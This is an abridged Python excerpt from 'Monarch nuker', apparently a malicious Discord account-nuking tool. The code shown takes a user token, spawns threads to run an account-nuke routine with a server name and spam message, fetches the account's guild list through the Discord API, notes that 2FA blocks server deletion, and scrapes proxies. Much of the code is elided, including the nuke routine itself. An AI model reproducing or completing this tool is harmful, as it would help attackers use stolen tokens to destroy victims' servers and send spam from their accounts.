...
def main():
    ...
    if choice == "1":
        ...
        if threading.active_count() < threads:
            threading.Thread(target=util.accountNuke.Monarch_Nuke, args=(token, Server_Name, message_Content)).start()
            return
        ...
        if token.startswith("mfa."):
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Just a headsup Monarch wont be able to delete the servers since the account has 2fa enabled')
            sleep(3)
        processes = []
        #get all servers
        guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
        if not guildsIds:
            print(f"{Fore.RESET}No Server Left...")
            sleep(3)
            main()
...
if __name__ == "__main__":
    ...
    if os.path.basename(sys.argv[0]).endswith("exe"):
        with open(getTempDir()+"\\monarch_proxies", 'w'): pass
        if not os.path.exists(getTempDir()+"\\monarch_theme"):
            setTheme('hazardous')
        clear()
        proxy_scrape()
        sleep(1.5)
    ...
    try:
        ...
        print(f"{Fore.RED}your python version ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}) is not compatible with monarch nuker, please download python 3.7+")
        sleep(5)
        print("exiting. . .")
        sleep(1.5)
        os._exit(0)
